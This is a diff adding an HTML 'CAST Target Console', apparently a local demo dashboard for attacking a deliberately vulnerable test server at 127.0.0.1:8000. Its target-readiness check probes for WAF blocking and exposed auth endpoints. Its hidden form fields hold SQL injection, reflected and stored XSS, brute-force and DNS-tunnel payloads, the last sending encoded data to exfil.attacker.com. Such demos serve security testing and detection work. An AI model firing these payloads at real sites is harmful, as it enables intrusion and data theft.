@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CAST Target Console</title>
+  <style>
+    :root {
+      --bg: #0b1220;
+      --panel: rgba(17, 26, 46, 0.9);
+      --card: rgba(255, 255, 255, 0.03);
+      --border: rgba(255, 255, 255, 0.08);
+      --text: #e8eefc;
+      --muted: #a7b3d1;
+      --accent: #6ea8fe;
+      --danger: #ef4444;
+      --success: #22c55e;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      background: radial-gradient(1200px 800px at 20% 0%, #152a57 0%, var(--bg) 55%);
+      color: var(--text);
+      min-height: 100vh;
+    }
+
+    .page { max-width: 1200px; margin: 0 auto; padding: 28px; }
+    .top  { margin-bottom: 20px; }
+
+    .brand {
+      font-size: 56px; font-weight: 800; margin: 0; letter-spacing: 0.4px;
+      background: linear-gradient(135deg, var(--accent), #c4d9ff);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+    }
+    .sub { margin-top: 8px; color: var(--muted); font-size: 18px; }
+
+    .panel {
+      background: var(--panel); border: 1px solid var(--border); border-radius: 18px;
+      padding: 22px; backdrop-filter: blur(10px);
+      box-shadow: 0 20px 50px rgba(0,0,0,0.2); margin-bottom: 20px;
+    }
+
+    .panel-title {
+      font-size: 18px; font-weight: 700; margin: 0 0 16px 0;
+      display: flex; align-items: center; gap: 10px;
+    }
+
+    .dot {
+      width: 10px; height: 10px; border-radius: 50%;
+      background: var(--muted); flex-shrink: 0; transition: background 0.3s;
+    }
+    .dot.running { background: var(--accent); animation: pulse 1s infinite; }
+    .dot.pass    { background: var(--success); }
+    .dot.fail    { background: var(--danger); }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+    .hc-input-row { display: flex; gap: 10px; margin-bottom: 16px; }
+    .hc-input-row input[type="text"] {
+      flex: 1; background: rgba(255,255,255,0.05); border: 1px solid var(--border);
+      border-radius: 10px; color: var(--text); font-size: 14px;
+      font-family: monospace; padding: 10px 14px; outline: none; transition: border-color 0.2s;
+    }
+    .hc-input-row input[type="text"]:focus { border-color: rgba(110,168,254,0.5); }
+
+    .hc-checks { display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px; }
+
+    .hc-row {
+      display: flex; align-items: center; gap: 12px;
+      padding: 11px 16px; background: var(--card);
+      border: 1px solid var(--border); border-radius: 12px; transition: border-color 0.25s;
+    }
+    .hc-row.pass    { border-color: rgba(34,197,94,0.4); }
+    .hc-row.fail    { border-color: rgba(239,68,68,0.4); }
+    .hc-row.running { border-color: rgba(110,168,254,0.4); }
+
+    .hc-icon {
+      width: 22px; height: 22px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 12px; font-weight: 700; flex-shrink: 0;
+      border: 1px solid var(--border); background: rgba(255,255,255,0.04);
+    }
+    .hc-icon.pass    { background: rgba(34,197,94,0.15);  border-color: rgba(34,197,94,0.5);  color: var(--success); }
+    .hc-icon.fail    { background: rgba(239,68,68,0.15);  border-color: rgba(239,68,68,0.5);  color: var(--danger); }
+    .hc-icon.running { background: rgba(110,168,254,0.12); border-color: rgba(110,168,254,0.4); }
+
+    .spinner {
+      width: 11px; height: 11px;
+      border: 1.5px solid rgba(110,168,254,0.3); border-top-color: var(--accent);
+      border-radius: 50%; animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .hc-label  { font-size: 14px; color: var(--text); flex: 1; }
+    .hc-detail { font-size: 12px; color: var(--muted); font-family: monospace; text-align: right; }
+    .hc-detail.pass    { color: var(--success); }
+    .hc-detail.fail    { color: var(--danger); }
+    .hc-detail.running { color: var(--accent); }
+
+    .hc-summary {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 14px 18px; border-radius: 12px;
+      border: 1px solid var(--border); background: var(--card);
+    }
+    .hc-summary.hidden    { display: none; }
+    .hc-summary.ready     { border-color: rgba(34,197,94,0.4);  background: rgba(34,197,94,0.07); }
+    .hc-summary.not-ready { border-color: rgba(239,68,68,0.4);  background: rgba(239,68,68,0.07); }
+
+    .hc-summary-status           { font-size: 15px; font-weight: 700; }
+    .hc-summary-status.ready     { color: var(--success); }
+    .hc-summary-status.not-ready { color: var(--danger); }
+    .hc-summary-sub { font-size: 12px; color: var(--muted); margin-top: 3px; font-family: monospace; }
+
+    button {
+      border: 1px solid rgba(110,168,254,0.35);
+      background: linear-gradient(135deg, rgba(110,168,254,0.22), rgba(110,168,254,0.12));
+      color: var(--text); padding: 12px 18px; border-radius: 12px;
+      cursor: pointer; font-size: 15px; font-weight: 700; transition: 0.2s ease;
+    }
+    button:hover:not(:disabled) { transform: translateY(-1px); }
+    button:disabled { opacity: 0.45; cursor: not-allowed; }
+
+    .btn-sm      { padding: 10px 18px; font-size: 14px; border-radius: 10px; }
+    .btn-success {
+      border-color: rgba(34,197,94,0.4);
+      background: linear-gradient(135deg, rgba(34,197,94,0.2), rgba(34,197,94,0.1));
+      color: var(--success);
+    }
+    .danger {
+      border-color: rgba(239,68,68,0.35);
+      background: linear-gradient(135deg, rgba(239,68,68,0.18), rgba(239,68,68,0.08));
+    }
+
+    .status-row {
+      display: grid; grid-template-columns: repeat(4, minmax(0,1fr));
+      gap: 14px; margin-bottom: 20px;
+    }
+    .status-card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 18px; }
+    .status-label { color: var(--muted); font-size: 14px; margin-bottom: 10px; }
+    .status-value { font-size: 28px; font-weight: 800; word-break: break-word; }
+
+    .grid { display: grid; grid-template-columns: repeat(2, minmax(0,1fr)); gap: 16px; }
+    .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; }
+    .card h3 { margin: 0 0 10px 0; font-size: 24px; }
+    .card p  { margin: 0 0 16px 0; color: var(--muted); font-size: 15px; line-height: 1.5; }
+    .btn-row { display: flex; flex-wrap: wrap; gap: 10px; }
+    form { margin: 0; }
+
+    .response-title { margin: 0 0 14px 0; font-size: 24px; }
+    iframe {
+      width: 100%; height: 420px;
+      border: 1px solid var(--border); border-radius: 14px; background: #08101f;
+    }
+
+    @media (max-width: 900px) {
+      .status-row, .grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+
+    <div class="top">
+      <h1 class="brand">CAST</h1>
+      <div class="sub">Target Console</div>
+    </div>
+
+    <!-- ── Target Health Check ── -->
+    <div class="panel">
+      <div class="panel-title">
+        <span class="dot" id="hc-dot"></span>
+        Target Health Check
+      </div>
+
+      <div class="hc-input-row">
+        <input type="text" id="hc-url" value="http://127.0.0.1:8000" placeholder="http://target-host:port" />
+        <button class="btn-sm" id="hc-run-btn" onclick="runHealthCheck()">Run Checks</button>
+      </div>
+
+      <div class="hc-checks" id="hc-checks"></div>
+
+      <div class="hc-summary hidden" id="hc-summary">
+        <div>
+          <div class="hc-summary-status" id="hc-summary-status"></div>
+          <div class="hc-summary-sub"    id="hc-summary-sub"></div>
+        </div>
+        <button class="btn-sm btn-success" id="hc-launch-btn" disabled onclick="scrollToAttacks()">
+          Ready to Attack ↓
+        </button>
+      </div>
+    </div>
+
+    <!-- ── Server Status + Attack Cards ── -->
+    <div class="panel" id="attack-section">
+      <div class="status-row">
+        <div class="status-card">
+          <div class="status-label">Server</div>
+          <div class="status-value">127.0.0.1:8000</div>
+        </div>
+        <div class="status-card">
+          <div class="status-label">Purpose</div>
+          <div class="status-value">Attack Demo</div>
+        </div>
+        <div class="status-card">
+          <div class="status-label">Status</div>
+          <div class="status-value">Ready for testing</div>
+        </div>
+        <div class="status-card">
+          <div class="status-label">Output</div>
+          <div class="status-value">Live server response</div>
+        </div>
+      </div>
+
+      <div class="grid">
+        <div class="card">
+          <h3>Server</h3>
+          <p>Check the server and clear test state.</p>
+          <div class="btn-row">
+            <form method="GET" action="/health" target="responseFrame">
+              <button type="submit">Health Check</button>
+            </form>
+            <form method="POST" action="/reset" target="responseFrame">
+              <button type="submit" class="danger">Reset State</button>
+            </form>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3>SQL Injection</h3>
+          <p>Demo the vulnerable search and login routes.</p>
+          <div class="btn-row">
+            <form method="GET" action="/search" target="responseFrame">
+              <input type="hidden" name="q" value="' OR '1'='1">
+              <button type="submit">SQLi Search</button>
+            </form>
+            <form method="POST" action="/login" target="responseFrame">
+              <input type="hidden" name="username" value="admin'--">
+              <input type="hidden" name="password" value="anything">
+              <button type="submit">SQLi Login</button>
+            </form>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3>XSS</h3>
+          <p>Demo reflected and stored XSS routes.</p>
+          <div class="btn-row">
+            <form method="GET" action="/reflect" target="responseFrame">
+              <input type="hidden" name="msg" value="<script>alert(1)</script>">
+              <button type="submit">Reflected XSS</button>
+            </form>
+            <form method="POST" action="/comment" target="responseFrame">
+              <input type="hidden" name="content" value="<script>alert('stored')</script>">
+              <button type="submit">Stored XSS</button>
+            </form>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3>Other Attacks</h3>
+          <p>Demo brute force and DNS tunnel style traffic.</p>
+          <div class="btn-row">
+            <form method="POST" action="/bf_login" target="responseFrame">
+              <input type="hidden" name="username" value="admin">
+              <input type="hidden" name="password" value="wrongpass">
+              <button type="submit">Brute Force</button>
+            </form>
+            <form method="POST" action="/dns_query" target="responseFrame">
+              <input type="hidden" name="hostname" value="aGVsbG8gd29ybGQ.exfil.attacker.com">
+              <button type="submit">DNS Tunnel</button>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Server Response ── -->
+    <div class="panel">
+      <h2 class="response-title">Server Response</h2>
+      <iframe name="responseFrame" title="Server Response"></iframe>
+    </div>
+
+  </div>
+
+  <script>
+    // Label map — must match the `id` fields returned by /health_check in tserver.py
+    const CHECK_LABELS = {
+      reachable:        'Host reachable',
+      http_200:         'HTTP response received',
+      latency_ok:       'Latency within threshold',
+      input_fields:     'Input fields found',
+      waf_check:        'No WAF / CDN blocking',
+      headers_exposed:  'Server headers exposed',
+      auth_endpoint:    'Auth endpoint detected',
+    };
+
+    function buildIdleRows() {
+      document.getElementById('hc-checks').innerHTML =
+        Object.entries(CHECK_LABELS).map(([id, label]) => `
+          <div class="hc-row" id="hc-row-${id}">
+            <div class="hc-icon" id="hc-icon-${id}"></div>
+            <span class="hc-label">${label}</span>
+            <span class="hc-detail" id="hc-detail-${id}">—</span>
+          </div>`).join('');
+    }
+
+    function applyRow(id, state, detail) {
+      const row  = document.getElementById('hc-row-'    + id);
+      const icon = document.getElementById('hc-icon-'   + id);
+      const det  = document.getElementById('hc-detail-' + id);
+      if (!row) return;
+      row.className  = 'hc-row '    + state;
+      icon.className = 'hc-icon '   + state;
+      det.className  = 'hc-detail ' + state;
+      if (state === 'running') {
+        icon.innerHTML  = '<div class="spinner"></div>';
+        det.textContent = 'checking...';
+      } else {
+        icon.textContent = state === 'pass' ? '✓' : state === 'fail' ? '✕' : '';
+        det.textContent  = detail || '—';
+      }
+    }
+
+    async function runHealthCheck() {
+      const base    = (document.getElementById('hc-url').value || 'http://127.0.0.1:8000').replace(/\/$/, '');
+      const runBtn  = document.getElementById('hc-run-btn');
+      const dot     = document.getElementById('hc-dot');
+      const summary = document.getElementById('hc-summary');
+
+      runBtn.disabled    = true;
+      runBtn.textContent = 'Running...';
+      dot.className      = 'dot running';
+      summary.className  = 'hc-summary hidden';
+
+      buildIdleRows();
+      Object.keys(CHECK_LABELS).forEach(id => applyRow(id, 'running'));
+
+      let data;
+      try {
+        const res = await fetch('http://127.0.0.1:8000/health_check?url=' + encodeURIComponent(base));
+        data = await res.json();
+      } catch (_) {
+        Object.keys(CHECK_LABELS).forEach((id, i) =>
+          applyRow(id, 'fail', i === 0 ? 'Connection refused' : 'skipped')
+        );
+        dot.className      = 'dot fail';
+        runBtn.disabled    = false;
+        runBtn.textContent = 'Run Checks';
+        showSummary(false, 0, Object.keys(CHECK_LABELS).length, base);
+        return;
+      }
+
+      data.checks.forEach(c => applyRow(c.id, c.pass ? 'pass' : 'fail', c.detail));
+
+      const passed = data.checks.filter(c => c.pass).length;
+      dot.className      = 'dot ' + (data.all_pass ? 'pass' : 'fail');
+      runBtn.disabled    = false;
+      runBtn.textContent = 'Run Checks';
+      showSummary(data.all_pass, passed, data.checks.length, base);
+    }
+
+    function showSummary(allPass, passed, total, base) {
+      const summary   = document.getElementById('hc-summary');
+      const statusEl  = document.getElementById('hc-summary-status');
+      const subEl     = document.getElementById('hc-summary-sub');
+      const launchBtn = document.getElementById('hc-launch-btn');
+      const state     = allPass ? 'ready' : 'not-ready';
+      summary.className    = 'hc-summary ' + state;
+      statusEl.className   = 'hc-summary-status ' + state;
+      statusEl.textContent = allPass ? 'Target is ready for attack' : 'Target failed health check';
+      subEl.textContent    = `${passed} / ${total} checks passed · ${base}`;
+      launchBtn.disabled   = !allPass;
+    }
+
+    function scrollToAttacks() {
+      document.getElementById('attack-section').scrollIntoView({ behavior: 'smooth', block: 'start' });
+    }
+
+    buildIdleRows();
+  </script>
+</body>
+</html>
